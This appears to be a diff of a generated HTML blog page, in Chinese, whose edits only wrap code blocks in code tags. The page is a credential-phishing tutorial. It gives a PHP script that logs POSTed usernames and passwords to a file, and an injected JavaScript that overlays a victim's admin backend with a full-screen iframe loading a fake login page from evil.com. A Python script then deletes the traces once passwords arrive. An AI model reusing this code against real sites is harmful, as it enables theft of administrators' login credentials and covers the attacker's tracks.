@@ -39,11 +39,11 @@
       
       <p><a href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
 <p>准备材料：</p>
-<div class="highlight"><pre><span></span><span class="err">目标登录页面</span><span class="o">:</span> <span class="n">login</span><span class="o">.</span><span class="na">html</span>
+<div class="highlight"><pre><span></span><code><span class="err">目标登录页面</span><span class="o">:</span> <span class="n">login</span><span class="o">.</span><span class="na">html</span>
 <span class="err">假的登录页面</span><span class="o">:</span> <span class="n">fake</span><span class="o">.</span><span class="na">html</span>
 <span class="err">世界上最好的语言</span><span class="o">:</span> <span class="n">deal</span><span class="o">.</span><span class="na">php</span>
 <span class="n">fish</span><span class="o">.</span><span class="na">js</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>步骤:</p>
@@ -56,7 +56,7 @@ wget -r -p -np -k 网站地址</li>
 <ul>
 <li>然后再服务器上构造一个deal.php</li>
 </ul>
-<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
 <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
 <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;pass.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
@@ -64,16 +64,16 @@ wget -r -p -np -k 网站地址</li>
 <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
 <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: http://normal.com/manage&quot;</span><span class="p">);</span> <span class="c1">//跳转到正常的后台</span>
 <span class="cp">?&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <ul>
 <li>还差一个js</li>
 </ul>
-<div class="highlight"><pre><span></span> document.body.innerHTML=&#39;<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;position:absolute;top:0px;left:0px;width:100%;height:100%&quot;</span><span class="nt">&gt;</span>&#39;+
+<div class="highlight"><pre><span></span><code> document.body.innerHTML=&#39;<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;position:absolute;top:0px;left:0px;width:100%;height:100%&quot;</span><span class="nt">&gt;</span>&#39;+
 &#39;<span class="nt">&lt;iframe</span> <span class="na">frameborder=</span><span class="s">&quot;no&quot;</span> <span class="na">scrolling=</span><span class="s">&quot;no&quot;</span> <span class="na">border=</span><span class="s">&quot;no&quot;</span> <span class="na">src=</span><span class="s">http://evil.com/fake.html</span> <span class="na">width=</span><span class="s">100%</span> <span class="na">height=</span><span class="s">100%</span><span class="nt">&gt;</span>&#39; +
 &#39;<span class="nt">&lt;/iframe&gt;&lt;/div&gt;</span>&#39;
-</pre></div>
+</code></pre></div>
 
 
 <p>当fish.js插入到后台的时候，会覆盖掉当前页面，然后受害者输入用户密码，就可以在服务器上收到用户密码。</p>
@@ -91,7 +91,7 @@ wget -r -p -np -k 网站地址</li>
 11
 12
 13
-14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># coding: utf-8</span>
 
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -100,12 +100,12 @@ wget -r -p -np -k 网站地址</li>
 
 <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
     <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="s1">&#39;pass.txt&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="k">print</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+        <span class="nb">print</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf fish.js&quot;</span><span class="p">)</span>
         <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;rm -rf fake.html&quot;</span><span class="p">)</span>
         <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 </td></tr></table>
 
 <p>至此构造完成，当python脚本退出的时候，密码就记录到了pass.txt文件</p>
